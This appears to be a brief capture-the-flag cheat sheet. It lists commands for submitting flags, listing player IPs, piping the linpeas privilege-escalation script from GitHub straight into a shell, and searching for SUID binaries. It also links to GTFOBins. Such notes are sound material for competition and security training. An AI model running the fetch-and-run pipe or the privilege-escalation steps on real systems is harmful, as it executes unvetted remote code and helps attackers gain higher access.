## running script for submit flag 
```
./submit_flag.py "random-hex" 
# or
python3 submit_flag.py "random-hex"
```

## running script for get list ip player
```
./list_player.py 
# list only ip 
./list_player.py ip
```

## running tool on background and redirect the output
```
ping -c5 8.8.8.8 > temp/output.log 2>&1 &
```

## linpeash
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

## binary suid
```
find /bin -perm -4000
find / -perm -u=s -type f 2>/dev/null
```

## python directory list
```
python -m SimpleHTTPServer 80
```

## gtfobin
```
https://gtfobins.github.io/
```


